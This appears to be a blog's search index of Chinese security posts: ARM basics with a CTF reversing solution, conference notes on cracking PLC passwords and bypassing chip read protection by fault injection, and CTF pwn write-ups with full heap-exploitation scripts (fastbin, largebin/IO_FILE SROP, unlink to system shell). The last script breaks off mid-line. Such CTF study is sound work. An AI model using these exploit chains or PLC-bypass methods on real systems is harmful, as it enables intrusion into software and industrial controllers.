<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[ARM架构知识点]]></title>
      <url>/arm/2020/11/07/ARM%E6%9E%B6%E6%9E%84%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      <content type="text"><![CDATA[0x01 前言终于忙完了长亭入职的事情，整理一下最近学习ARM的一些知识点，帮助自己更好迎接西湖论剑IOT闯关赛0x02 ARMArm架构是RISC,相对于Intel的CISC比较精简，但功能可能没有相对那么强大。0x03 寄存器arm架构中有30个32位通用寄存器,前16个可在用户级模式下访问R0-R15分为通用寄存器和专用寄存器32位            寄存器      别名      用途                  R0      -      通用              R1      -      通用              R2      -      通用              R3      -      通用              R4      -      通用              R5      -      通用              R6      -      Syscall number              R7      -      通用              R8      -      通用              R9      -      通用              R10      -      通用              R11      FP      Frame pointer(类似EBP)              R12      IP      程序调用              R13      SP      堆栈指针（类似ESP）              R14      LR      链接调用函数              R15      PC      程序计数器              CSPR      -      Current Program Status Register      64位:            寄存器      别名                  X0 – X7      arguments and return value              X8 – X18      temporary registers              X19 – X28      callee-saved registers              X29      frame pointer              X30      link register              SP      stack pointer      这个表标注了ARM的一些常见知识点没事的话可以拿来熟读一下图片来源：https://azeria-labs.com/assembly-basics-cheatsheet/0x04 例子  下面以一道简单的CTF的题来进入ARM的世界[b01lers2020]train_arms这道题非常简单，一个main.s文件和一个result.txtResult.txt：  7049744c7b5e721e31447375641a6e5e5f42345c337561586d597dmain.s:.cpu cortex-m0.thumb.syntax unified.fpu softvfp.data     flag: .string "REDACTED" //len = 28.text.global mainmain:    ldr r0,=flag    eors r1,r1    eors r2,r2    movs r7,#1    movs r6,#42loop:    ldrb r2,[r0,r1]    cmp r2,#0    beq exit    lsls r3,r1,#0    ands r3,r7    cmp r3,#0    bne f1//if odd    strb r2,[r0,r1]    adds r1,#1    b loopf1:    eors r2,r6    strb r2,[r0,r1]    adds r1,#1    b loopexit:    wfi逻辑就是循环去flag的每一个字符，然后如果下表位是奇数位则flag[i]^42否则flag[i]不做处理其中要注意的是  instruction（s） 代表更新标志位这样逆向处理就是a = "7049744c7b5e721e31447375641a6e5e5f42345c337561586d597d"j = 0for i in range(0,len(a),2):    if j%2 ==1:        print chr(int(a[i] + a[i + 1], 16) ^ 42),    else:        print chr(int(a[i]+a[i+1],16)),    j = j+1# pctf{tr41ns_d0nt_h4v3_arms}0x05 结语希望我这篇小文章对你有帮助如有疑问请在下方留言]]></content>
      <categories>
        
          <category> ARM </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[芯片内存保护]]></title>
      <url>/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/2020/10/26/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E7%9C%8B%E9%9B%AASDC/</url>
      <content type="text"><![CDATA[密码保护刚从看雪SDC回来,着实有点累,收获了很多知识,本文主要整理SDC里面讲的东西密码机制保护突破针对PLC将核心算法dump罗：登录PLC 创建新user 嗅探登录操作的流量，从控制器获取密码施耐德：特殊内存读取，提取加密凭证，加密凭证下发创建会话链接-&gt;获取访问权限西门子工控设备密码突破_S7-200：读取EEPRoM 更改1个字节的密码等级，伪造客户端夏装院士原始系统关键参数烧写设备，校验，提取原bin文件中系统系统块参数，使用伪造的客户端封装系统块豹纹进行下装，让控制端自己计算正确的2字节校验值从流量破开原始密码，授权算法：请求PLC rkey 返回22字节获取交互报文-&gt;破解案例及方法S7Commplus V3 带有完整性校验与加密协议:流量尝试从硬件Flash中获取信息在线爆破-&gt;伪造客户端，控制器对于请求速率有限制，破解效率低离线爆破-&gt;密码算法复杂度一般，但hash算法中salt通过uart有诊断（后门）接口，执行任意代码，fuzzing…转储内存区，寻找密码信息，调试过程中替换密码hash值hash传递攻击硬件拆解，读取bin，寻找关键信息–熟悉硬件芯片，加密算法，精准定位设计保护机制：软件层面：加壳，虚拟保护技术让PLC 认证PRA，完整性校验，加密保护关键敏感信息在可信区双向认证物理防护密码强度摒弃明文密码流量中不携带极拿单加密的敏感信息认证次数去掉调试功能芯片内存保护读保护-防护突破1.常见芯片固件提取2.芯片内存保护攻击方法3.低成本测信道攻击4.芯片内存防护方案MCU架构SOC架构：蓝牙芯片，wifi芯片SOC内存保护–配置字加密作用：禁止调试  方法一：调试总线仲裁利用SWD      方法二：地址总线复位向量利用        方法三：总线寄存器利用：    使用调试器访问权限    重置CPU    查看初始化寄存器    单步执行    查看寄存器值的变化    根据权限的寄存器值查看          低成本测信道攻击            在bootloader 过程中 跳过读保护的判断，根据测信道功耗查看复位功耗，明显功耗变化，VCC注入（故障注入）启动超压(控制在纳秒之内），使cpu休眠状态，跳过读保护          收集研究数据表            确定电源  工具      控制器：推荐FPGA，注入控制器工作频率&gt;= 被注入控制器工作频率        引脚切换：是推荐MAX4619，不要使用引脚切换供电        信号发生器        30V稳压器  ]]></content>
      <categories>
        
          <category> 工控安全 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[西湖论剑2020]]></title>
      <url>/ctf/pwn/2020/10/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91pwn/</url>
      <content type="text"><![CDATA[前言这道题非常简单,第一种方法是fastbin_attack返回到栈中，然后泄漏canary和libc，然后覆盖返回地址为One_Gadget我自己脑子抽风用了第二种方法，也是提升自己布置堆风水的能力逻辑分析1.这道题一开始给了我们一个gift:栈上的地址，分配堆的大小都是0x68,有个UAF的漏洞，但是只能布置10个堆，同时可以修改栈上的内容，并输出栈上的内容思路首先这道题无论分配和释放都只能用到fastbin,所以只能用fastbin_attack,同时给了我们栈上的地址,且能输出栈上的内容,那毫无疑问是用fastbin_attack分配到栈中泄漏地址和ROP了,但同时我们可以注意到我们分配的栈上的地址是0x7f开头的,我们可以控制bss段heap的分配位置，如果我们能构成p64(0x7f)，也是能分配到bss上进行操作的,所以我运用了堆的思想又分配到了bss段中，这样可以多次使用fastbin_attack了，然后fastbin_attack分配到malloc_hook-0x23将malloc_hook修改为one_gadget然后getsehll代码# 完整脚本可看我的githubcontext.arch = "amd64"payload = p64(0)+p64(0x71)+p64(0)+p64(0)sla('please input you name:',payload)ru("this is your tag: 0x")stack_addr = r(12)stack_addr = int(stack_addr,16)success("stack_addr:0x%x",stack_addr)sleep(0.1)sla('choice',2)Add(3)Add(4)Del(3)Del(4)Del(3)payload = p64(0)+p64(0x71)+p64(0)+p64(0)Set_stack(payload)Add(5,p64(stack_addr-0x40))Add(6)Add(7,p64(0))Add(1,'a'*0x40+'b'*0x8)Set_stack('a'*0x20)ru('b'*0x8)libc_base = uu64(r(6))-0x20840success('libc:0x%x',libc_base)malloc_hook = libc_base + 0x3c4aedone_gadget = libc_base + 0xf0364Del(3)Del(4)Del(3)payload = p64(0x6020c5)Add(8,payload)Add(9)Add(10)Add(2,'\x00'+p64(0)*6)Del(10)Del(9)Del(10)Add(3,p64(malloc_hook))Add(4)Add(5)Add(6,'\x00'*3+p64(one_gadget)*8)success("one_gadget:0x%x",one_gadget)Set_stack('\x00'*0x20)success('one_gadget:0x%x',one_gadget)Choice(1)sla('id:',8)irt()如果想看第一种方法的可以参考：https://bbs.pediy.com/thread-262526.htm]]></content>
      <categories>
        
          <category> CTF/PWN </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[HWS_cookie]]></title>
      <url>/ctf/pwn/2020/10/04/HWS_cookie/</url>
      <content type="text"><![CDATA[前言参加完HWS之后一直对这道题怎么解很感兴趣，由于这道题用了2.31的新版本libc,自己对新版本libc的利用还未完全掌握，通过这道题让我对libc2.31有了更深的了解，本文是转载的，exp代码有做修改方便阅读和了解，原版的请查看下面文章来源：安全客作者：cnitlrt原文链接:https://www.anquanke.com/post/id/216290largebin attacklargebin attack在2.30之后添加了一些检查，不能使用之前先插入小large bin，再插入大largebin实现attack，而是先插入大的再插入小的，查看源码：else{  victim_index = largebin_index (size);  bck = bin_at (av, victim_index);  fwd = bck-&gt;fd;  /* maintain large bins in sorted order */  if (fwd != bck)    {      /* Or with inuse bit to speed comparisons */      size |= PREV_INUSE;      /* if smaller than smallest, bypass loop below */      assert (chunk_main_arena (bck-&gt;bk));      if ((unsigned long) (size)  &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))        {          fwd = bck;          bck = bck-&gt;bk;          victim-&gt;fd_nextsize = fwd-&gt;fd;          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;        }      else        {          assert (chunk_main_arena (fwd));          while ((unsigned long) size &lt; chunksize_nomask (fwd))            {              fwd = fwd-&gt;fd_nextsize;  assert (chunk_main_arena (fwd));            }          if ((unsigned long) size  == (unsigned long) chunksize_nomask (fwd))            /* Always insert in the second position.  */            fwd = fwd-&gt;fd;          else            {              victim-&gt;fd_nextsize = fwd;              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;              if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");              fwd-&gt;bk_nextsize = victim;              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            }          bck = fwd-&gt;bk;          if (bck-&gt;fd != fwd)            malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");        }    }  else    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;}mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;看到红色部分，检查了前面的fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd 以及 bck-&gt;fd != fwd，所以常用的方法已经不奏效了。但是我们这里仅检查了unsortedbin size &gt; largbin size，却没有检查large bin &lt; unsorted bin，所以我们可以在largbin中添加一个堆块，同时释放一个比它小并且在同一index的堆块进unsortedbin,改变largbin的bk_nextsize为targetaddr-0x20,然后我们申请一个free之后可以放入unsortedbin的堆块,这时会将unsortedbin放入largbin，然后就会执行fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;此时 victim-&gt;bk_nextsize = target_addr-0x20,target_addr-0x20-&gt;fd_nextsize = target_addr = victim，即可将堆地址放入到我们想要的地方。IO_FIle攻击原理：在以前版本的IO_FILE攻击普遍上采用的是劫持IO函数的_chain字段为伪造的IO_FILE_plus然后进行利用，其中伪造的IO_FILE_plus的vtable一般是io_str_overflow这种函数，而新版本的IO_FILE攻击也不例外，首先我们看一下libc2.32上的io_str_overflow函数int_IO_str_overflow (FILE *fp, int c){  int flush_only = c == EOF;  size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    {      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    }  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))    {      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */    return EOF;      else    {      char *new_buf;      char *old_buf = fp-&gt;_IO_buf_base;      size_t old_blen = _IO_blen (fp);      size_t new_size = 2 * old_blen + 100;      if (new_size &lt; old_blen)        return EOF;      new_buf = malloc (new_size);      if (new_buf == NULL)        {          /*      __ferror(fp) = 1; */          return EOF;        }      if (old_buf)        {          memcpy (new_buf, old_buf, old_blen);          free (old_buf);          /* Make sure _IO_setb won't try to delete _IO_buf_base. */          fp-&gt;_IO_buf_base = NULL;        }      memset (new_buf + old_blen, '\0', new_size - old_blen);      _IO_setb (fp, new_buf, new_buf + new_size, 1);      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);      fp-&gt;_IO_write_base = new_buf;      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;    }    }  if (!flush_only)    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;  return c;}可以看到程序里面有malloc,memcpy,free等函数，并且参数我们都可以控制因此可以利用这一点来进行非预期的堆块申请释放和填充,而且我们看一下IO_str_overflow的汇编代码可以看到一个有意思的位置：   0x7ffff7e6eb20 &lt;__GI__IO_str_overflow&gt;:    repz nop edx   0x7ffff7e6eb24 &lt;__GI__IO_str_overflow+4&gt;:    push   r15   0x7ffff7e6eb26 &lt;__GI__IO_str_overflow+6&gt;:    push   r14   0x7ffff7e6eb28 &lt;__GI__IO_str_overflow+8&gt;:    push   r13   0x7ffff7e6eb2a &lt;__GI__IO_str_overflow+10&gt;:    push   r12   0x7ffff7e6eb2c &lt;__GI__IO_str_overflow+12&gt;:    push   rbp   0x7ffff7e6eb2d &lt;__GI__IO_str_overflow+13&gt;:    mov    ebp,esi   0x7ffff7e6eb2f &lt;__GI__IO_str_overflow+15&gt;:    push   rbx   0x7ffff7e6eb30 &lt;__GI__IO_str_overflow+16&gt;:    sub    rsp,0x28   0x7ffff7e6eb34 &lt;__GI__IO_str_overflow+20&gt;:    mov    eax,DWORD PTR [rdi]   0x7ffff7e6eb36 &lt;__GI__IO_str_overflow+22&gt;:    test   al,0x8   0x7ffff7e6eb38 &lt;__GI__IO_str_overflow+24&gt;:    jne    0x7ffff7e6eca0 &lt;__GI__IO_str_overflow+384&gt;   0x7ffff7e6eb3e &lt;__GI__IO_str_overflow+30&gt;:    mov    edx,eax   0x7ffff7e6eb40 &lt;__GI__IO_str_overflow+32&gt;:    mov    rbx,rdi   0x7ffff7e6eb43 &lt;__GI__IO_str_overflow+35&gt;:    and    edx,0xc00   0x7ffff7e6eb49 &lt;__GI__IO_str_overflow+41&gt;:    cmp    edx,0x400   0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:    je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;   0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:    mov    rdx,QWORD PTR [rdi+0x28]  &lt;----   0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:    mov    r14,QWORD PTR [rbx+0x38]   0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:    mov    r12,QWORD PTR [rbx+0x40]   0x7ffff7e6eb61 &lt;__GI__IO_str_overflow+65&gt;:    xor    ecx,ecx   0x7ffff7e6eb63 &lt;__GI__IO_str_overflow+67&gt;:    mov    rsi,rdx   0x7ffff7e6eb66 &lt;__GI__IO_str_overflow+70&gt;:    sub    r12,r14   0x7ffff7e6eb69 &lt;__GI__IO_str_overflow+73&gt;:    cmp    ebp,0xffffffff   0x7ffff7e6eb6c &lt;__GI__IO_str_overflow+76&gt;:    sete   cl   0x7ffff7e6eb6f &lt;__GI__IO_str_overflow+79&gt;:    sub    rsi,QWORD PTR [rbx+0x20]   0x7ffff7e6eb73 &lt;__GI__IO_str_overflow+83&gt;:    add    rcx,r12   0x7ffff7e6eb76 &lt;__GI__IO_str_overflow+86&gt;:    cmp    rcx,rsi   0x7ffff7e6eb79 &lt;__GI__IO_str_overflow+89&gt;:    ja     0x7ffff7e6ec4a &lt;__GI__IO_str_overflow+298&gt;   0x7ffff7e6eb7f &lt;__GI__IO_str_overflow+95&gt;:    test   al,0x1   0x7ffff7e6eb81 &lt;__GI__IO_str_overflow+97&gt;:    jne    0x7ffff7e6ecc0 &lt;__GI__IO_str_overflow+416&gt;   0x7ffff7e6eb87 &lt;__GI__IO_str_overflow+103&gt;:    lea    r15,[r12+r12*1+0x64]可以看到在调用malloc之前的0x7ffff7e6eb55位置rdx被赋值为[rdi+0x28],而此时的rdi恰好指向我们伪造的IO_FILE_plus的头部，而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此我们可以通过这个位置来进行新版下的setcontext,进而实现srop,具体做法是利用非预期地址填充将malloc_hook填充为setcontext，这样在我们进入io_str_overflow时首先会将rdx赋值为我们可以控制的地址，然后在后面malloc的时候会触发setcontext，而此时rdx已经可控，因此就可以成功实现srop综上可知参数对应关系为：_flags = 0_IO_write_ptr = 用于srop的地址（此时同时满足了fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base）new_buf = malloc(2 * (_IO_buf_end - _IO_buf_base ) + 100)memcpy(new_buf，_IO_buf_base，_IO_buf_end - _IO_buf_base)free(_IO_buf_base)攻击流程此种方法一般结合largebin attrack,因为largebin attrack可以实现任意地址填充堆地址，因此我们可以利用largebin attrack将io函数的_chain字段劫持为堆地址，然后当程序退出的时候会刷新程序流此时会进入我们伪造的io_file中实现我们的攻击,下面我们用我出的一个例题来具体体会一下该方法的威力练习此题为HWS – cookie分析：该题为glibc2.31,程序有add del edit show功能，在del里面有着明显的uaf漏洞，并且开了沙盒，add的时候只能申请largebin范围的堆块并且不超过0x600利用：我们考虑使用largebin attrack劫持stderr-&gt;_chain字段为一个堆地址并且劫持global_max_fast为堆地址用来构造chunkoverlapping,通过chunkoverlapping在0xa0的bin中留下两个堆块，其中一个是malloc_hook,然后我们利用io_file的非预期堆块申请申请到malloc_hook同时用非预期填充将malloc_hook填充为setcontext,这样在进入下一个fake IO_FILE的时候就会触发srop进而orw出flag,由此我们需要构造三个fake IO_FILE_plus，前两个用来申请到malloc_hook并且将malloc_hook填充为setcontext,最后一个用来设置rdx的值同时触发srop,调试我们进行简单的调试直观的看一下，首先我们通过chunkoverlapping来在0xa0的堆块中放入两个堆块，此时的bin:然后我们看一下我们的fake IO_FILE_plusFake IO_FILE_plus1(malloc(0x90))payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #rdxpayload += p64(heap_base+0x10+0x290)+p64(heap_base+22+0x10+0x290)+p64(0)*4 #sizepayload += p64(heap_base+0x1a90)+p64(0)+p64(0)+"\x00"*8 #_chainpayload += p64(0)*4+"\x00"*48payload += p64(0x1ed560+libc_base)可以看到第二行的两个地址差22，而通过我们的size计算可以得出size = (0x90-100)/2 = 22执行完之后：Fake IO_FILE_plus2(malloc(0x90) &amp;&amp; hijack malloc_hook = setcontext)payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #rdxpayload += p64(heap_base+0x30+0x290)+p64(heap_base+22+0x30+0x290)+p64(0)*4 #sizepayload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8 #chainpayload += p64(0)*4+"\x00"*48payload += p64(0x1ed560+libc_base)执行之后：可以看到已经成功将malloc_hook劫持为setcontext,接下来执行第三个IO_FILE_plus就会触发srop，orw出flagFake IO_FILE_plus3:(srop)payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #writepayload += p64(heap_base+0x50+0x290)+p64(heap_base+22+0x50+0x290)+p64(0)*4payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8payload += p64(0)*4+"\x00"*48payload += p64(0x1ed560+libc_base)完整exp:#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author: cnitlrtimport sysimport osimport refrom pwn import *# context.log_level = 'debug'binary = './cookie'elf = ELF('./cookie')libc = elf.libccontext.binary = binaryDEBUG = 1if DEBUG:  p = process(binary)else:  host = sys.argv[1]  port =  sys.argv[2]  p = remote(host,port)o_g = [0x45216,0x4526a,0xf02a4,0xf1147]magic = [0x3c4b10,0x3c67a8,0x846c0,0x45390]#malloc,free,realloc,systeml64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))sla = lambda a,b  :p.sendlineafter(str(a),str(b))sa  = lambda a,b  :p.sendafter(str(a),str(b))lg  = lambda name,data : p.success(name + ": 0x%x" % data)se  = lambda payload: p.send(payload)rl  = lambda      : p.recv()sl  = lambda payload: p.sendline(payload)ru  = lambda a     :p.recvuntil(str(a))def cmd(idx):    sla("&gt;&gt;",str(idx))def add(size,payload):    cmd(1)    sla("Size:\n",str(size))    sa("Content:\n",payload)def show(idx):    cmd(3)    sla("Index:\n",str(idx))def free(idx):    cmd(2)    sla("Index:\n",str(idx))def edit(idx,payload):    cmd(4)    sla("Index:\n",str(idx))    sa("Content:\n",payload)def ss():    gdb.attach(p)    pause()def exp():    add(0x458,"aaaa")    add(0x500,"aaaa")    add(0x468,"aaaa")    add(0x500,"aaaa")#3    add(0x500,"aaaa")#4    add(0x500,"aaaa")#5    add(0x500,"aaaa")#6    add(0x500,"aaaa")#7    add(0x500,"aaaa")#8    #leak libc_base    free(2)    show(2)    libc_base = l64()-libc.sym['__malloc_hook']-0x10-96    lg("libc_base",libc_base)    #put chunk2 into largebin    add(0x600,"aaaa")#9    #leak heap_base    edit(2,"a"*0x19)    show(2)    ru("a"*0x18)    heap_base = u64(p.recv(6).ljust(8,"\x00"))-0xc61    lg("heap_base",heap_base)     #put chunk0 into unsortedbin    free(0)    #hijack stderr-&gt;_chain = chunk2    edit(2,p64(0)*3+p64(0x1ec628+libc_base-0x20))#stderr-&gt;_chain    add(0x448,"aaa")#10    free(10)    #hijack global_max_fast = chunk2    edit(2,p64(0)*3+p64(0x1eeb80+libc_base-0x20))#global_max_fast    add(0x448,"aaa")#11    #chunk overlapping    edit(3,"a"*0x40+p64(0)+p64(0x511))    edit(4,"a"*0x30+p64(0)+p64(0x21)*10)    free(3)    edit(3,p64(heap_base+0x10c0))    add(0x500,"aaa")    add(0x500,"ddd")#13    edit(4,"a"*0x90+p64(0)+p64(0x471))    edit(13,"a"*0x4b0+p64(0)+p64(0xa1))    #fastbin attrack    free(4)    edit(4,p64(libc.sym["__malloc_hook"]+libc_base-0x10)+p64(0))    free(4)    edit(4,p64(libc.sym["__malloc_hook"]+libc_base-0x10)+p64(0))    """    tcachebins    0xa0 [  2]: 0x56074fb96590 —▸ 0x7f116d446b60 (__memalign_hook) —▸ 0x7f116d2f8570 (memalign_hook_ini) ◂— ...    fastbins    """    chunk1_addr = heap_base + 0x290    chunk5_addr = heap_base + 0x1a90    chunk6_addr = heap_base + 0x1fa0    chunk8_addr = heap_base+0x29d0    io_str_overflow_61 = 0x1ed560+libc_base    payload = p64(0x580dd+libc_base)+p64(0x21) #setcontext    edit(0,payload*50)    #malloc(0x90)    payload = p64(0)*2+p64(0)+p64(chunk8_addr)+p64(0) #write    payload += p64(chunk1_addr+0x10)+p64(22+0x10+chunk1_addr)+p64(0)*4    payload += p64(chunk5_addr)+p64(0)+p64(0)+"\x00"*8    payload += p64(0)*4+"\x00"*48    payload += p64(io_str_overflow_61)    edit(2,payload)    #malloc(0x90) &amp;&amp; set malloc_hook = setcontext + 0x61    payload = p64(0)*2+p64(0)+p64(chunk8_addr)+p64(0) #write    payload += p64(heap_base+0x30+0x290)+p64(chunk1_addr+22+0x30)+p64(0)*4    payload += p64(chunk6_addr)+p64(0)+p64(0)+"\x00"*8    payload += p64(0)*4+"\x00"*48    payload += p64(io_str_overflow_61)    edit(5,payload)    #trigger &amp;&amp; rdx = QWORD PTR [rdi+0x28] = heap_base+0x29d0    payload = p64(0)*2+p64(0)+p64(chunk8_addr)+p64(0) #write    payload += p64(chunk1_addr+0x50)+p64(chunk1_addr+22+0x50)+p64(0)*4    payload += p64(chunk6_addr)+p64(0)+p64(0)+"\x00"*8    payload += p64(0)*4+"\x00"*48    payload += p64(io_str_overflow_61)    edit(6,payload)    # ss()    free_hook = libc_base+libc.sym["__free_hook"]    free_hook1 = free_hook&amp;0xfffffffffffff000    syscall = libc_base+0x0000000000066229    #fakeframe    frame = SigreturnFrame()    frame.rdi = 0    frame.rsi = free_hook1    frame.rdx = 0x2000    frame.rsp = free_hook1    frame.rip = syscall    edit(8,str(frame))    poprdi = 0x0000000000026b72+libc_base    poprsi = libc_base+0x0000000000027529    pop2rdx = libc_base+0x000000000011c1e1    poprax = libc_base+0x000000000004a550    #mprotect(free_hook1,0x2000,7) &amp;&amp; orw shellcode    payload = [poprdi,free_hook1,poprsi,0x2000,pop2rdx,0x7,0]    payload += [poprax,10,syscall,free_hook1+0x58]    sc = shellcraft.open("flag",0)    sc += shellcraft.read("rax",free_hook1+0x300,0x40)    sc += shellcraft.write(1,free_hook1+0x300,0x40)    cmd(5)    p.send(flat(payload)+asm(sc))    p.interactive()if __name__ == "__main__":    exp()  声明：本文经安全客授权发布，转载请联系安全客平台]]></content>
      <categories>
        
          <category> CTF/PWN </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Unlink 使用技巧]]></title>
      <url>/ctf/pwn/2020/09/17/Unlink-%E6%8A%80%E5%B7%A7/</url>
      <content type="text"><![CDATA[前言该题运用的是C++ vector机制的漏洞，当vector未放入数据的话，会按照0x20、0x30、0x50、0x90……来分配和释放内存，这个机制本身可以实现vector来管理内存，不用让开发者担心内存管理的问题，但是如果开发者不了解这些机制，并且将vector的内存地址保存在某个地址未做及时更新的话，那么我们就可以利用这个机制来实现很多操作！题目逻辑分析堆菜单题：Add:往vector push一个数据Show:获取原来的bss地址作为iterator对象存放在0x605380+0x18的位置vector.push(0xaabbccdd)然后将新的堆块的数据地址-8存放在0x605380+0x20的位置开始展示数据并询问是否修改由于新旧的堆块地址不同，所有就有UAF那味道了clear():清理vector，但是不会清除堆块的内容EXP编写思路：先添加9个数据，使得分配一个unsorted_bin，然后clear，利用UAF来leak libc_base的地址​            后面通过在堆上布置一些数据，防止绕过一些检查​			然后再添加8个数据,接着通过push 0xaabbccdd添加一个数据使得给vector分配一个unsorted bin​            通过修改这个bin的内容来unlink​            具体表示：​             -0x10   —-prev_size.      #1​             0x90     —- size (prev_inuse=0) #​              0.          —- prev_size #2​              0x21    —–  size #​              Target_addr-0x18 —fd​              Target_addr-0x10 —-bk​              0x20 –   fake_prev_size​     		修改完之后，iterator和heap_addr的地址是指向这个3的，当再添加到16个数据的时候,show会释放掉堆块也就是释放了chunk1，这时unlink检查prev_use == 0 则chunk2 = chunk1+prev_size-&gt;chunk2,检查到 fake_prev_size == size 和fd与bk之后发生unlink.​             这时bss_heap_pool_addr就会指向自己,通过修改bss_heap_pool就可以实现任意地址写,将__free_hook-8和____free_hook改成/bin/sh（这里是字符串)和&amp;system即可getshell#https://github.com/matrix1001/welpwnfrom PwnContext import *try:    from IPython import embed as ipyexcept ImportError:    print ('IPython not installed.')if __name__ == '__main__':            context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux    context.log_level = 'debug'    # functions for quick script    s       = lambda data               :ctx.send(str(data))        #in case that data is an int    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data))     sl      = lambda data               :ctx.sendline(str(data))     sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))     r       = lambda numb=4096          :ctx.recv(numb)    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)    irt     = lambda                    :ctx.interactive()    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)    # misc functions    uu32    = lambda data   :u32(data.ljust(4, '\0'))    uu64    = lambda data   :u64(data.ljust(8, '\0'))    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))    debugg = 1    logg = 1    ctx.binary = './pwn1'    ctx.remote_libc = './libc-2.23.so'        ctx.debug_remote_libc = False # True for debugging remote libc, false for local.    #ctx.breakpoints = [0x401131,0x40114d,0x40122B]    ctx.symbols = {'pool':0x605380}    #ctx.debug()    if debugg:    	rs()    else:        ctx.remote = ('1.1.1.1', 1111)        rs(method = 'remote')    if logg:	    context.log_level = 'debug'    # rs('remote') # uncomment this for exploiting remote target    libc = ctx.libc # ELF object of the corresponding libc.        def Choice(num):    	sla('&gt;&gt;',num)    def Add(content):    	Choice(1)    	sla('num:',content)    def Edit_target(flag='n',recv='n',content=None,size=0):    	res = None    	target_heap_addr = None    	if recv == 'y':    	    ru(':')    	    res = int(r(size))    	    #log.success('targer_addr:%s'%target_heap_addr)    	sla('Edit (y/n):',flag)    	#res = None    	if flag == 'y':	    		sleep(0.1)    		sl(content)    	return res    def Clear():    	Choice(3)    def Show():    	Choice(2)    bss_addr = 0x605380    Add(123)    Add(123)    Show()    heap_addr = Edit_target('n','y',size = 8)    for i in range(5):    	Edit_target()    for i in range(7):    	Add(123)    Clear()    Add(123)    Show()    Edit_target()    leak_addr = Edit_target('n','y',size=15)    #dbg()    log.success('heap_addr:%s'%hex(heap_addr))    log.success('leak_addr:%s'%hex(leak_addr-0x6cdb78))    libc_base = leak_addr-0x6cdb78    free_hook = libc_base + 0x6cf7a8    system  = libc_base + 0x34e3a0    for i in range(3):        Edit_target()    #Show()    #Add(123)    #Add(123)    Clear()    for i in range(17):    	Add(0x21)    Clear()        for i in range(8):    	Add(0x20)    #dbg()    #raw_input()    Show()    for i in range(8):    	Edit_target()    Edit_target('y','n',-0x10)    Edit_target('y','n',0x90)    Edit_target('y','n',0)    Edit_target('y','n',0x21)    Edit_target('y','n',0x605398-0x18)    Edit_target('y','n',0x605398-0x10)    for i in range(4):    	Edit_target()    for 